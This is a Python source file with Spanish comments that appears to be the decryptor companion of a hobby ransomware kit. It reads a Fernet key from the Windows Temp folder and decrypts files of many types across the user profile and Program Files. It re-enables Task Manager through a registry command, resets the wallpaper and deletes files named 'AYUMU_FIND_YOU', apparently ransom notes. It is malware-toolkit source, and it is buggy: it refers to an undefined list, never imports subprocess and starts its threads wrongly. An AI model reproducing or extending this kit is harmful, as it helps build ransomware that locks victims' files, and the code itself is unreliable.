from cryptography.fernet import Fernet 
import os , threading , platform , ctypes

#Aca casi no hay diferencia con el encriptador solo el hecho de que aca programe para que borre las fotos que previamente cree

def retornar_key():
    return open("C:\\Windows\\Temp\\key.key" , "rb").read()
        

    
def desencryptador(path , key):
    f = Fernet(key)
    
    with open(path , "rb") as l:
        bytes_hj = l.read()
    Archivos_desencriptado = f.decrypt(bytes_hj)
    
    with open(path , "wb") as op:  
        op.write(Archivos_desencriptado)
            
def Rutas_a_desencriptar(ruta , llave):
    Directorios_desencriptar = list()
    
    Directorios_desencriptar.append(ruta)
    Rutas_2 = ["C:\\Users\\Public" , "C:\\Program Files(x86)" , "C:\\Program Files"]
    
    for a in Rutas_2:
        if os.path.exists(a):
            Directorios_encriptar.append(a)
        else:
            pass
    
    directorios = os.listdir(ruta)
    
    e = (".jpg" , ".mp3" , ".mp4" , ".txt" , ".doc" , ".ppt" , ".xls" , ".html" , ".py" , ".c" , ".c#",".cpp" , ".go" , ".ico" , 
    ".eml" , ".gif" , ".wav" , ".zip" , ".rar" , ".pdf" , ".iso" , ".mds" , ".docx" ,  ".bat" , ".mpeg" , ".ini" , "tar.gz" , 
    "paf.exe" , ".search-ms" , ".lnk" , ".contact" , ".pid" , ".json" , ".url" , ".exe", ".xz" , ".png",  ".db")
                
    for a in Directorios_desencriptar:
        try:
            A = os.listdir(a)
            for b in A:
                if os.path.isdir(f"{a}\\{b}"):
                    Directorios_desencriptar.append(f"{a}\\{b}")    
                else:
                    desencryptador(f"{a}\\{b}" , llave)
        except Exception:
            pass

def delete_photos():
    
    try:
        Ruta_wallpaper = "C:\\Windows\\Web\\Wallpaper\\Nature\\img3.jpg"
        ctypes.windll.user32.SystemParametersInfoW(20 , 0 , Ruta_wallpaper , 0)
    except Exception:
        pass
        
    ruta = "C:\\"
    
    Ruta_completa = list()
    Ruta_completa.append(ruta)
    Rutas_2 = ["C:\\Users\\Public" , "C:\\Program Files(x86)" , "C:\\Program Files"]
    
    for a in Rutas_2:
        if os.path.exists(a):
            Ruta_completa.append(a)
        else:
            pass
         
    for c in Ruta_completa:
        try:
            Archivos = os.listdir(c)
            for G in Archivos:
                if G.startswith("AYUMU_FIND_YOU"):
                    os.remove(f"{c}\\{G}") # Y las borra con esto
                else:
                    Ruta_completa.append(f"{c}\\{G}")
        except Exception:
            pass
            
def main():
    try:
        subprocess.run("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 0 /f", shell=True)
    except Exception:
        pass
        
    DEFAULT_PATH = os.getenv("userprofile")
    
    llave = retornar_key()
    Rutas = Rutas_a_desencriptar(DEFAULT_PATH , llave)
    
if __name__ == "__main__":
    
    
    Proceso1 = threading.Thread(target= main())
    Proceso2 = threading.Thread(target= delete_photos())
    
    Proceso1.start()
    Proceso2.start()
    
    Proceso1.join()
    Proceso2.join()

    
